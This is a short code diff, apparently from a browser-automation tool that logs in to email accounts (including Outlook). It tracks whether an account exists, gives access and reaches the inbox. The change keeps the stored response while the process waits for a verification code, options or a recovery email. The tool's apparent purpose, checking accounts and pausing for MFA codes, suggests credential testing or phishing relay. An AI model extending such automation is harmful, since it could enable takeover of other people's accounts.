@@ -5792,20 +5792,23 @@ if (!foundSelector) {
         // can identify the correct code entry view type (e.g. Outlook Authenticator OTP)
         // rather than falling through to generic selectors (#iOttText etc.).
         const finalViewName = initialCheckResult.viewName || (JSON.parse(updateData.lastJsonResponse || '{}').viewName) || '';
+        const waitingStates = ['WAITINGCODE', 'WAITINGOPTIONS', 'WAITINGRECOVERYEMAIL'];
         updateData = {
             status: finalStatus,
-            lastJsonResponse: JSON.stringify({
-                browserId, email, status: finalStatus,
-                emailExists: initialCheckResult.emailExists,
-                accountAccess: initialCheckResult.accountAccess,
-                reachedInbox: initialCheckResult.reachedInbox,
-                requiresVerification: initialCheckResult.requiresVerification,
-                verificationState: initialCheckResult.verificationState,
-                verificationOptions: currentVerificationOptions,
-                viewName: finalViewName,
-                platform, timestamp: new Date().toISOString(),
-                message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
-            })
+            lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
+                ? updateData.lastJsonResponse
+                : JSON.stringify({
+                    browserId, email, status: finalStatus,
+                    emailExists: initialCheckResult.emailExists,
+                    accountAccess: initialCheckResult.accountAccess,
+                    reachedInbox: initialCheckResult.reachedInbox,
+                    requiresVerification: initialCheckResult.requiresVerification,
+                    verificationState: initialCheckResult.verificationState,
+                    verificationOptions: currentVerificationOptions,
+                    viewName: finalViewName,
+                    platform, timestamp: new Date().toISOString(),
+                    message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
+                })
         };
 
         if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
